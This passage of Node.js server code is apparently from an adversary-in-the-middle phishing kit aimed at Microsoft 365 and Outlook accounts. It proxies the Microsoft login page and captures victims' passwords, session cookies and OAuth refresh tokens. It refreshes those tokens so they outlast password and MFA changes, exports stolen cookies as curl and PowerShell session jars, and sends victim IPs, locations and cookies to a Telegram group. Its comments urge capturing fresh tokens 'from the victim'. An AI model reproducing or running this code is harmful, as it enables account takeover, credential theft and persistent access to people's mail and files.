          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      }
    );
    
    console.log('✅ Graph token refreshed successfully');
    res.json(response.data);
    
  } catch (error) {
    console.error('❌ Graph token refresh failed:', error.response?.data || error.message);
    res.status(error.response?.status || 500).json({ 
      error: 'Graph token refresh failed',
      details: error.response?.data || error.message 
    });
  }
});



// ============= MIGRATE EXISTING TOKENS TO PERSISTENT SYSTEM =============
// Enhanced migration with detailed error diagnosis
app.post('/api/migrate-token/:sessionId', express.json(), async (req, res) => {
  const sessionId = req.params.sessionId;
  const { refreshToken, resource = 'outlook' } = req.body;
  
  if (!refreshToken) {
    return res.status(400).json({ 
      error: 'No refresh token provided',
      solution: 'You need to provide a valid refresh token'
    });
  }
  
  // Get session data if it exists
  const session = capturedData.get(sessionId) || { credentials: {}, tokens: {}, cookies: [] };
  
  try {
    const testClaims = JSON.stringify({
      access_token: {
        xms_cc: { values: ["CP1"] }
      }
    });
    
    console.log(`🔄 Testing refresh token for session ${sessionId}...`);
    
    const testResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
      new URLSearchParams({
        client_id: resource === 'graph' ? DUAL_TOKEN_CLIENT_ID : DESKTOP_CLIENT_ID,
        refresh_token: refreshToken,
        grant_type: 'refresh_token',
        scope: resource === 'graph' 
          ? 'https://graph.microsoft.com/.default offline_access'
          : 'https://outlook.office.com/.default offline_access',
        claims: testClaims
      }).toString(),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        timeout: 15000
      }
    );
    
    const newTokens = testResponse.data;
    
    // Create token manager
    const tokenManager = new PersistentTokenManager(sessionId, newTokens, resource);
    
    if (!session.tokenManagers) session.tokenManagers = {};
    session.tokenManagers[resource] = tokenManager;
    
    // Update stored tokens
    if (resource === 'outlook') {
      if (!session.tokens) session.tokens = {};
      session.tokens.outlook = {
        access_token: newTokens.access_token,
        refresh_token: newTokens.refresh_token,
        expires_in: newTokens.expires_in,
        scope: newTokens.scope,
        captured_at: new Date().toISOString(),
        expires_at: tokenManager.expiresAt,
        migrated: true
      };
    } else if (resource === 'graph') {
      if (!session.tokens) session.tokens = {};
      session.tokens.graph = {
        access_token: newTokens.access_token,
        refresh_token: newTokens.refresh_token,
        expires_in: newTokens.expires_in,
        scope: newTokens.scope,
        captured_at: new Date().toISOString(),
        expires_at: tokenManager.expiresAt,
        migrated: true
      };
    }
    
    capturedData.set(sessionId, session);
    
    const message = `🔄 *Token Migrated Successfully*\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Session:* \`${sessionId}\`\n` +
      `*Resource:* ${resource}\n` +
      `*Expires:* ${new Date(tokenManager.expiresAt).toLocaleString()}\n` +
      `*Status:* ✅ Token now survives password & MFA changes`;
    
    if (bot && telegramGroupId) {
      await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' });
    }
    
    res.json({
      success: true,
      message: 'Token successfully migrated to persistent CAE system',
      tokenStatus: tokenManager.getStatus(),
      note: 'This token will now survive password and MFA changes'
    });
    
  } catch (error) {
    console.error('❌ Migration failed:', error.message);
    
    // Detailed error diagnosis
    let errorType = 'unknown';
    let errorMessage = 'Migration failed';
    let solution = '';
    
    if (error.response?.status === 400) {
      const errorCode = error.response?.data?.error;
      const errorDesc = error.response?.data?.error_description;
      
      switch (errorCode) {
        case 'invalid_grant':
          errorType = 'revoked_token';
          errorMessage = '❌ Refresh token is invalid or revoked';
          solution = `This token has been revoked. Common causes:
• The user changed their password (tokens are automatically revoked for security)
• The user signed out from "All Devices" 
• The token expired (refresh tokens last 90 days)
• Admin revoked the session in Azure AD

💡 Solution: You need to capture a new token from the victim.`;
          break;
          
        case 'invalid_request':
          errorType = 'invalid_request';
          errorMessage = '❌ Invalid request format';
          solution = 'Check if the refresh token is correctly formatted and not truncated.';
          break;
          
        case 'unauthorized_client':
          errorType = 'unauthorized';
          errorMessage = '❌ Client not authorized';
          solution = 'The application client ID may have been revoked or changed.';
          break;
          
        default:
          errorMessage = `❌ Error: ${errorCode || 'unknown'}`;
          solution = errorDesc || 'Unknown error occurred';
      }
    } else if (error.code === 'ECONNABORTED' || error.code === 'ETIMEDOUT') {
      errorType = 'timeout';
      errorMessage = '❌ Request timeout';
      solution = 'Network issue - try again later.';
    } else if (error.message.includes('getaddrinfo')) {
      errorType = 'network';
      errorMessage = '❌ Network error';
      solution = 'Cannot connect to Microsoft servers. Check your internet connection.';
    }
    
    res.status(400).json({
      success: false,
      error: errorMessage,
      errorType: errorType,
      details: error.response?.data || error.message,
      solution: solution,
      recommendations: [
        '1. Try to capture a new token from the victim using your phishing pages',
        '2. Check if the user is still active in your organization',
        '3. For enterprise accounts, admin might have revoked the session',
        '4. Use the /en-us/microsoft-365/outlook endpoint to capture fresh tokens'
      ]
    });
  }
});


// Diagnose token issues
app.post('/api/diagnose-token', express.json(), async (req, res) => {
  const { refreshToken } = req.body;
  
  if (!refreshToken) {
    return res.status(400).json({ error: 'No refresh token provided' });
  }
  
  const diagnosis = {
    tokenPresent: true,
    tokenLength: refreshToken.length,
    tokenPreview: refreshToken.substring(0, 20) + '...',
    tests: []
  };
  
  // Test 1: Basic format check
  if (refreshToken.match(/^[A-Za-z0-9\-._~+/]+=*$/)) {
    diagnosis.tests.push({ name: 'Format', status: 'pass', message: 'Token format looks valid' });
  } else {
    diagnosis.tests.push({ name: 'Format', status: 'fail', message: 'Token contains invalid characters' });
  }
  
  // Test 2: Try with Outlook scope
  try {
    const testResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
      new URLSearchParams({
        client_id: DESKTOP_CLIENT_ID,
        refresh_token: refreshToken,
        grant_type: 'refresh_token',
        scope: 'https://outlook.office.com/.default offline_access'
      }).toString(),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        timeout: 10000
      }
    );
    
    diagnosis.tests.push({ 
      name: 'Outlook API Test', 
      status: 'pass', 
      message: 'Token works with Outlook API',
      expiresIn: testResponse.data.expires_in
    });
    
    diagnosis.valid = true;
    
  } catch (error) {
    if (error.response?.status === 400) {
      const errorCode = error.response?.data?.error;
      diagnosis.tests.push({ 
        name: 'Outlook API Test', 
        status: 'fail', 
        message: `Error: ${errorCode} - ${error.response?.data?.error_description || 'Unknown error'}`,
        errorCode: errorCode
      });
      
      if (errorCode === 'invalid_grant') {
        diagnosis.reason = 'Token revoked - user likely changed password or signed out';
      }
    } else {
      diagnosis.tests.push({ 
        name: 'Outlook API Test', 
        status: 'error', 
        message: error.message 
      });
    }
    diagnosis.valid = false;
  }
  
  // Test 3: Try with Graph scope if Outlook test failed
  if (!diagnosis.valid) {
    try {
      const testResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
        new URLSearchParams({
          client_id: DUAL_TOKEN_CLIENT_ID,
          refresh_token: refreshToken,
          grant_type: 'refresh_token',
          scope: 'https://graph.microsoft.com/.default offline_access'
        }).toString(),
        {
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          timeout: 10000
        }
      );
      
      diagnosis.tests.push({ 
        name: 'Graph API Test', 
        status: 'pass', 
        message: 'Token works with Graph API (but not Outlook)',
        expiresIn: testResponse.data.expires_in
      });
      
      diagnosis.valid = true;
      diagnosis.worksWith = 'graph';
      
    } catch (error) {
      diagnosis.tests.push({ 
        name: 'Graph API Test', 
        status: 'fail', 
        message: error.response?.data?.error || error.message 
      });
    }
  }
  
  res.json(diagnosis);
});
// Bulk migrate all sessions with refresh tokens
app.post('/api/migrate-all-tokens', async (req, res) => {
  const results = [];
  let migrated = 0;
  let failed = 0;
  
  for (const [sessionId, session] of capturedData.entries()) {
    let hasRefreshToken = false;
    let refreshToken = null;
    let resource = null;
    
    // Check for Outlook token
    if (session.tokens?.outlook?.refresh_token) {
      refreshToken = session.tokens.outlook.refresh_token;
      resource = 'outlook';
      hasRefreshToken = true;
    }
    // Check for Graph token
    else if (session.tokens?.graph?.refresh_token) {
      refreshToken = session.tokens.graph.refresh_token;
      resource = 'graph';
      hasRefreshToken = true;
    }
    // Check for desktop token
    else if (session.tokens?.refresh_token) {
      refreshToken = session.tokens.refresh_token;
      resource = 'outlook';
      hasRefreshToken = true;
    }
    
    if (hasRefreshToken && refreshToken) {
      try {
        const testClaims = JSON.stringify({
          access_token: {
            xms_cc: { values: ["CP1"] }
          }
        });
        
        const testResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
          new URLSearchParams({
            client_id: resource === 'graph' ? DUAL_TOKEN_CLIENT_ID : DESKTOP_CLIENT_ID,
            refresh_token: refreshToken,
            grant_type: 'refresh_token',
            scope: resource === 'graph' 
              ? 'https://graph.microsoft.com/.default offline_access'
              : 'https://outlook.office.com/.default offline_access',
            claims: testClaims
          }).toString(),
          {
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            timeout: 10000
          }
        );
        
        const newTokens = testResponse.data;
        const tokenManager = new PersistentTokenManager(sessionId, newTokens, resource);
        
        if (!session.tokenManagers) session.tokenManagers = {};
        session.tokenManagers[resource] = tokenManager;
        
        capturedData.set(sessionId, session);
        migrated++;
        results.push({ sessionId, resource, status: 'success' });
        
        console.log(`✅ Migrated token for session ${sessionId} (${resource})`);
        
      } catch (error) {
        failed++;
        results.push({ 
          sessionId, 
          resource, 
          status: 'failed', 
          error: error.response?.data?.error || error.message 
        });
        console.log(`❌ Failed to migrate token for session ${sessionId}:`, error.message);
      }
    }
  }
  
  const summaryMessage = `🔄 *Token Migration Complete*\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `*Total Sessions:* ${capturedData.size}\n` +
    `*Successfully Migrated:* ${migrated}\n` +
    `*Failed:* ${failed}\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `*Status:* ${migrated > 0 ? '✅ CAE-enabled tokens now survive password & MFA changes' : 'No valid refresh tokens found'}`;
  
  if (bot && telegramGroupId) {
    await bot.sendMessage(telegramGroupId, summaryMessage, { parse_mode: 'Markdown' });
  }
  
  res.json({
    success: true,
    total: capturedData.size,
    migrated,
    failed,
    results
  });
});

app.options('/api/refresh-graph', (req, res) => {
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(200);
});

// ============= SESSION-SPECIFIC REFRESH ENDPOINTS =============
app.post('/api/refresh-token/:sessionId', express.json(), async (req, res) => {
  console.log(`📥 Session-specific token refresh for ${req.params.sessionId}`);
  
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  const sessionId = req.params.sessionId;
  const session = capturedData.get(sessionId);
  
  if (!session || !session.tokens) {
    return res.status(404).json({ error: 'Session or tokens not found' });
  }
  
  const refreshToken = session.tokens.refresh_token || session.tokens.outlook?.refresh_token;
  
  if (!refreshToken) {
    return res.status(404).json({ error: 'No refresh token found in session' });
  }
  
  try {
    const claims = JSON.stringify({
      access_token: {
        xms_cc: { values: ["CP1"] }
      }
    });
    
    const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
      new URLSearchParams({
        client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
        refresh_token: refreshToken,
        grant_type: 'refresh_token',
        scope: 'https://outlook.office.com/.default offline_access',
        claims: claims
      }).toString(),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)'
        }
      }
    );
    
    const newTokens = response.data;
    
    if (session.tokens.outlook) {
      session.tokens.outlook.access_token = newTokens.access_token;
      if (newTokens.refresh_token) session.tokens.outlook.refresh_token = newTokens.refresh_token;
    } else {
      session.tokens.access_token = newTokens.access_token;
      if (newTokens.refresh_token) session.tokens.refresh_token = newTokens.refresh_token;
    }
    
    session.tokens.refreshed_at = new Date().toISOString();
    capturedData.set(sessionId, session);
    
    console.log(`✅ Token refreshed for session ${sessionId}`);
    res.json({ 
      success: true, 
      message: 'Token refreshed',
      access_token: newTokens.access_token.substring(0, 50) + '...'
    });
    
  } catch (error) {
    console.error('❌ Session token refresh failed:', error.response?.data || error.message);
    res.status(500).json({ error: 'Failed to refresh token', details: error.message });
  }
});

app.post('/api/refresh-graph/:sessionId', express.json(), async (req, res) => {
  console.log(`📥 Session-specific Graph token refresh for ${req.params.sessionId}`);
  
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  const sessionId = req.params.sessionId;
  const session = capturedData.get(sessionId);
  
  if (!session || !session.tokens?.graph?.refresh_token) {
    return res.status(404).json({ error: 'No Graph refresh token found in session' });
  }
  
  try {
    const claims = JSON.stringify({
      access_token: {
        xms_cc: { values: ["CP1"] }
      }
    });
    
    const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
      new URLSearchParams({
        client_id: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
        refresh_token: session.tokens.graph.refresh_token,
        grant_type: 'refresh_token',
        scope: 'https://graph.microsoft.com/.default offline_access',
        claims: claims
      }).toString(),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      }
    );
    
    const newTokens = response.data;
    session.tokens.graph.access_token = newTokens.access_token;
    if (newTokens.refresh_token) session.tokens.graph.refresh_token = newTokens.refresh_token;
    session.tokens.graph.refreshed_at = new Date().toISOString();
    capturedData.set(sessionId, session);
    
    console.log(`✅ Graph token refreshed for session ${sessionId}`);
    res.json({ 
      success: true, 
      message: 'Graph token refreshed',
      access_token: newTokens.access_token.substring(0, 50) + '...'
    });
    
  } catch (error) {
    console.error('❌ Session Graph token refresh failed:', error.response?.data || error.message);
    res.status(500).json({ error: 'Failed to refresh Graph token', details: error.message });
  }
});

// ============= TEST GRAPH TOKEN ENDPOINT =============
app.get('/test-graph/:sessionId', async (req, res) => {
  const sessionId = req.params.sessionId;
  const session = capturedData.get(sessionId);
  
  if (!session || !session.tokens?.graph?.access_token) {
    return res.json({ error: 'No Graph token found for this session' });
  }
  
  const token = session.tokens.graph.access_token;
  
  try {
    const results = {};
    
    try {
      const profile = await axios.get('https://graph.microsoft.com/v1.0/me', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      results.profile = profile.data;
    } catch (e) {
      results.profile = { error: e.response?.data || e.message };
    }
    
    try {
      const groups = await axios.get('https://graph.microsoft.com/v1.0/me/memberOf', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      results.groups = groups.data.value?.length || 0;
    } catch (e) {
      results.groups = { error: e.response?.data || e.message };
    }
    
    try {
      const drive = await axios.get('https://graph.microsoft.com/v1.0/me/drive/root', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      results.onedrive = drive.data.name;
    } catch (e) {
      results.onedrive = { error: e.response?.data || e.message };
    }
    
    res.json({
      success: true,
      message: 'Graph token test results',
      results
    });
    
  } catch (error) {
    res.json({ error: error.message });
  }
});

// ============= EXPORT SESSION ENDPOINT =============
app.get('/export-session/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const exportSession = capturedData.get(sessionId);
  
  if (!exportSession) {
    return res.status(404).json({ error: 'Session not found' });
  }
  
  const cookieJar = {
    netscape: (exportSession.cookies || []).map(c => {
      const parts = c.split(';')[0].split('=');
      return `#HttpOnly_.outlook.live.com\tTRUE\t/\tTRUE\t0\t${parts[0]}\t${parts.slice(1).join('=')}`;
    }).join('\n'),
    
    json: (exportSession.cookies || []).map(c => {
      const parts = c.split(';')[0].split('=');
      return {
        name: parts[0],
        value: parts.slice(1).join('='),
        domain: '.outlook.live.com',
        path: '/',
        secure: true,
        httpOnly: true
      };
    }),
    
    tokens: exportSession.tokens,
    credentials: exportSession.credentials,
    graphUser: exportSession.graphUser
  };
  
  res.json({
    sessionId,
    exportFormats: {
      netscape: cookieJar.netscape,
      json: cookieJar.json,
      curl: `curl -b "${(exportSession.cookies || []).join(' -b "')}" https://outlook.live.com/mail/`,
      powershell: `$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession\n${(exportSession.cookies || []).map(c => {
        const parts = c.split(';')[0].split('=');
        return `$session.Cookies.Add((New-Object System.Net.Cookie("${parts[0]}", "${parts.slice(1).join('=')}", "/", ".outlook.live.com")))`;
      }).join('\n')}`
    },
    tokens: cookieJar.tokens,
    user: cookieJar.graphUser
  });
});

// ============= TOKEN CHECK ENDPOINT =============
app.get('/check-tokens/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const session = capturedData.get(sessionId);
  
  if (!session) {
    return res.json({ error: 'Session not found' });
  }
  
  res.json({
    sessionId,
    hasTokens: !!session.tokens,
    tokenInfo: session.tokens ? {
      hasOutlook: !!session.tokens.outlook,
      hasGraph: !!session.tokens.graph,
      hasDesktop: !!session.tokens.is_desktop,
      expires_in: session.tokens.expires_in || session.tokens.outlook?.expires_in,
      captured_at: session.tokens.captured_at,
      cae_enabled: true
    } : null,
    hasCredentials: !!session.credentials,
    cookieCount: session.cookies?.length || 0
  });
});

// ============= CAPTURED SESSIONS ENDPOINT =============
app.get('/captured-sessions', (req, res) => {
  const sessions = Array.from(capturedData.entries()).map(([id, sessionData]) => {
    const criticalCookies = (sessionData.cookies || []).filter(c => 
      c.includes('FedAuth') || 
      c.includes('x-ms-gateway-token') || 
      c.includes('ESTSAUTH') || 
      c.includes('ESTSAUTHPERSISTENT') || 
      c.includes('MSISAuth') || 
      c.includes('SignInStateCookie')
    );
    
    const hasOutlook = !!(sessionData.tokens?.outlook || sessionData.tokens?.access_token);
    const hasGraph = !!sessionData.tokens?.graph;
    
    return {
      id,
      username: sessionData.credentials?.username,
      hasPassword: !!sessionData.credentials?.password,
      cookieCount: sessionData.cookies?.length || 0,
      criticalCookies: criticalCookies.length,
      criticalCookieNames: criticalCookies.map(c => {
        const match = c.match(/([^=]+)=/);
        return match ? match[1] : 'unknown';
      }),
      hasOutlook,
      hasGraph,
      hasDualTokens: hasOutlook && hasGraph,
      tokenType: sessionData.tokens?.dual_capture ? 'Dual (Outlook+Graph) CAE-Enabled' : 
                 (sessionData.tokens?.is_desktop ? 'Desktop (90-day) CAE-Enabled' : 'Web (24-hour)'),
      victimInfo: sessionData.victimInfo || sessionData.credentials?.victimInfo,
      time: sessionData.credentials?.time || sessionData.time,
      cae_enabled: true
    };
  });
  
  res.json({ 
    total: capturedData.size, 
    sessions,
    note: 'CAE-enabled tokens survive password and MFA changes automatically'
  });
});

// ============= LOGIN CONFIRMED ENDPOINT =============
app.post('/api/login-confirmed', express.json(), (req, res) => {
  const { sessionId } = req.body;
  console.log(`✅ Login confirmed for session ${sessionId}`);
  res.json({ success: true });
});

// ============= PROXY OUTLOOK ENDPOINT =============
app.post('/proxy-outlook', express.json(), async (req, res) => {
  const token = req.body.token;
  
  console.log('📥 Proxy-outlook POST request received');
  console.log('Token present:', !!token);
  
  if (!token) {
    return res.status(400).json({ error: 'Missing token' });
  }
  
  try {
    const outlookResponse = await axios.get('https://outlook.live.com/mail/', {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      }
    });
    
    let html = outlookResponse.data;
    
    const injectionScript = `
      <script>
        (function() {
          const token = ${JSON.stringify(token)};
          console.log('🔑 Token injection started');
          
          localStorage.setItem('access_token', token);
          sessionStorage.setItem('access_token', token);
          
          const originalFetch = window.fetch;
          window.fetch = function(url, options = {}) {
            options.headers = options.headers || {};
            options.headers['Authorization'] = 'Bearer ' + token;
            return originalFetch.call(this, url, options);
          };
          
          console.log('✅ Token injection complete');
        })();
      </script>
    `;
    
    html = html.replace('</head>', injectionScript + '</head>');
    res.send(html);
    
  } catch (error) {
    console.error('❌ Proxy error:', error.message);
    res.status(500).send(`Error: ${error.message}`);
  }
});

// Serve the dashboard HTML file
app.get('/vapesmoke', (req, res) => {
  res.sendFile(path.join(__dirname, 'outlook-dashboard.html'));
});

app.get('/yuing', (req, res) => {
  res.sendFile(path.join(__dirname, 'outlook-dashboard.html'));
});

// ============= PROXY MIDDLEWARE =============
const microsoftProxy = createProxyMiddleware({
  target: MICROSOFT_LOGIN_URL,
  changeOrigin: true,
  secure: true,
  followRedirects: true,
  selfHandleResponse: true,
  logLevel: 'silent',
  on: {
    proxyReq: (proxyReq, req, res) => {
      const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
      proxyReq.setHeader('Host', 'login.microsoftonline.com');
      proxyReq.setHeader('Origin', 'https://login.microsoftonline.com');
      proxyReq.setHeader('Referer', 'https://login.microsoftonline.com/');
    },
    
    proxyRes: async (proxyRes, req, res) => {
      const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
      
      const cookies = proxyRes.headers['set-cookie'];
      if (cookies) {
        console.log(`\n🍪 [${sessionId}] PROXY CAPTURED ${cookies.length} COOKIES:`);
        cookies.forEach((c, i) => console.log(`   ${i+1}. ${c.substring(0, 100)}`));
        
        let proxySession = capturedData.get(sessionId);
        if (!proxySession) {
          proxySession = { cookies: [], credentials: {} };
        }
        if (!proxySession.cookies) proxySession.cookies = [];
        
        cookies.forEach(cookie => {
          if (!proxySession.cookies.includes(cookie)) {
            proxySession.cookies.push(cookie);
          }
        });
        
        capturedData.set(sessionId, proxySession);
      }
      
      let body = [];
      proxyRes.on('data', chunk => body.push(chunk));
      proxyRes.on('end', () => {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        res.end(Buffer.concat(body));
      });
    }
  }
});

app.use('/proxy', (req, res, next) => {
  const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
  const msParams = microsoftParams.get(sessionId) || {};
  
  if (req.method === 'POST') {
    req.body = { ...msParams, ...req.body };
    console.log('📤 Forwarding with params for session:', sessionId, Object.keys(req.body));
  }
  
  microsoftProxy(req, res, next);
});

// ============= CAPTURE ENDPOINTS =============
app.get('/capture', async (req, res) => {
  const { email = 'unknown', redirect = 'https://google.com' } = req.query;
  const cookies = req.cookies || {};
  
  if (bot && telegramGroupId && Object.keys(cookies).length > 0) {
    const victimInfo = await getVictimInfo(req);
    const cookiesText = Object.entries(cookies).map(([k, v]) => `• ${k}: ${v}`).join('\n');
    
    const message = 
      `🍪 *Cookies Captured*\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Email:* ${email}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Victim Information:*\n` +
      `*IP:* \`${victimInfo.ip}\`\n` +
      `*Location:* ${victimInfo.location}\n` +
      `*Browser:* ${victimInfo.browser}\n` +
      `*OS:* ${victimInfo.os}\n` +
      `*Time:* ${victimInfo.timestamp}\n\n` +
      `*Cookies:*\n${cookiesText}`;
    
    await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
      .catch(() => {});
  }
  
  res.redirect(302, redirect);
});

app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: Date.now(),
    uptime: process.uptime(),
    activeSessions: activeSessions.size,
    capturedSessions: capturedData.size,
    cae_status: 'Enabled - Tokens survive password & MFA changes'
  });
});

// ============= TRACKING ENDPOINTS =============
app.post('/api/track-page-view', express.json(), async (req, res) => {
  const { sessionId, template, url, timestamp, email } = req.body;
  
  console.log(`📊 Page view tracked: Session ${sessionId}, Template: ${template}${email ? `, Email: ${email}` : ''}`);
  
  let session = capturedData.get(sessionId) || {};
  session.pageView = {
    template,
    url,
    timestamp,
    email,
    viewedAt: new Date().toISOString()
  };
  capturedData.set(sessionId, session);
  
  if (bot && telegramGroupId) {
    const victimInfo = await getVictimInfo(req);
    
    const emailSection = email ? `*Email:* \`${email}\`\n` : '';
    
    const message = 
      `👁️ *Page View*\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Session:* \`${sessionId}\`\n` +
      `${emailSection}` +
      `*Template:* ${template}\n` +
      `*IP:* \`${victimInfo.ip}\`\n` +
      `*Location:* ${victimInfo.location}\n` +
      `*URL:* ${url}\n` +
      `*Time:* ${new Date().toLocaleString()}`;
    
    bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
      .catch(() => {});
  }
  
  res.json({ success: true });
});

app.post('/api/track-click', express.json(), async (req, res) => {
  const { sessionId, template, targetUrl, timestamp,email } = req.body;
  
  console.log(`🔗 Click tracked: Session ${sessionId}, Target: ${targetUrl}`);
  
  let session = capturedData.get(sessionId) || {};
  if (!session.clicks) session.clicks = [];
  session.clicks.push({
    targetUrl,
    template,
    email,
    timestamp,
    clickedAt: new Date().toISOString()
  });
  capturedData.set(sessionId, session);
  
  if (bot) {
    const victimInfo = await getVictimInfo(req);
    const emailSection = email ? `*Email:* \`${email}\`\n` : '';
    const message = 
      `🔗 *Link Clicked*\n` + 
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Session:* \`${sessionId}\`\n` +
      `${emailSection}` +
      `*Template:* ${template}\n` +
      `*Target:* ${targetUrl}\n` +
      `*IP:* \`${victimInfo.ip}\`\n` +
      `*Time:* ${new Date().toLocaleString()}`;
    
    bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
      .catch(() => {});
  }
  
  res.json({ success: true });
});

app.get('/track/click', async (req, res) => {
  try {
    const { email = 'unknown', campaign = 'unknown', link = '#', template = 'unknown', name = 'unknown' } = req.query;

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const agent = useragent.parse(userAgent);
    
    let location = 'Unknown';
    try {
      const geo = geoip.lookup(ip);
      if (geo) {
        location = `${geo.city || 'Unknown'}, ${geo.country || 'Unknown'}`;
      }
    } catch (e) {}

    const clickTime = new Date().toLocaleString();
    const token = crypto.randomBytes(4).toString('hex');

    console.log(`\n🔗 LINK CLICKED [${token}]`);
    console.log(`   Email: ${email}`);
    console.log(`   Campaign: ${campaign}`);
    console.log(`   Link: ${link}`);
    console.log(`   IP: ${ip}`);
    console.log(`   Time: ${clickTime}`);

    if (bot && telegramGroupId) {
      const message = 
        `🔗 *Link Clicked!*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `*Email:* \`${email}\`\n` +
        `*Name:* ${name}\n` +
        `*Campaign:* ${campaign}\n` +
        `*Template:* ${template}\n` +
        `*Link:* ${link}\n` +
        `*IP:* \`${ip}\`\n` +
        `*Location:* ${location}\n` +
        `*Browser:* ${agent.toAgent() || 'Unknown'}\n` +
        `*OS:* ${agent.os.toString() || 'Unknown'}\n` +
        `*Time:* ${clickTime}\n` +
        `*Token:* \`${token}\``;

      await bot.sendMessage(telegramGroupId, message, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      });
    }

    if (link && link !== '#') {
      return res.redirect(302, link);
    } else {
      return res.send(`<html>...</html>`);
    }

  } catch (error) {
    console.error('❌ Error tracking click:', error);
    if (req.query.link && req.query.link !== '#') {
      return res.redirect(302, req.query.link);
    }
    res.status(500).send('Error tracking click');
  }
});

// ============= DEBUG ENDPOINTS =============
app.get('/debug-verifiers', (req, res) => {
  const verifiers = [];
  for (const [id, verifier] of codeVerifiers.entries()) {
    verifiers.push({
      sessionId: id,
      verifierPrefix: verifier.substring(0, 20) + '...'
    });
  }
  res.json({
    total: codeVerifiers.size,
    verifiers
  });
});

app.get('/debug-sessions', (req, res) => {
  const debugSessions = [];
  for (const [id, data] of capturedData.entries()) {
    debugSessions.push({
      id,
      hasCredentials: !!data.credentials,
      username: data.credentials?.username,
      cookieCount: data.cookies?.length || 0,
      hasOutlook: !!(data.tokens?.outlook || data.tokens?.access_token),
      hasGraph: !!data.tokens?.graph,
      hasDualTokens: !!(data.tokens?.outlook && data.tokens?.graph),
      timestamp: data.credentials?.time || data.time,
      cae_enabled: true
    });
  }
  res.json({
    totalSessions: capturedData.size,
    sessions: debugSessions,
    note: "All tokens are CAE-enabled and survive password/MFA changes"
  });
});

app.get('/debug-all', (req, res) => {
  const allData = {};
  for (const [id, data] of capturedData.entries()) {
    allData[id] = {
      hasCookies: !!(data.cookies && data.cookies.length > 0),
      cookieCount: data.cookies?.length || 0,
      cookies: data.cookies || [],
      credentials: data.credentials,
      tokens: data.tokens ? {
        hasOutlook: !!data.tokens.outlook,
        hasGraph: !!data.tokens.graph,
        outlook_preview: data.tokens.outlook?.access_token?.substring(0, 50) + '...',
        graph_preview: data.tokens.graph?.access_token?.substring(0, 50) + '...'
      } : null
    };
  }
  res.json({
    totalSessions: capturedData.size,
    sessions: allData
  });
});

app.get('/debug-cookies/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const debugSession = capturedData.get(sessionId);
  
  if (!debugSession) {
    return res.json({ 
      error: 'Session not found', 
      availableSessions: Array.from(capturedData.keys()) 
    });
  }
  
  res.json({
    sessionId,
    hasCookies: !!(debugSession.cookies && debugSession.cookies.length > 0),
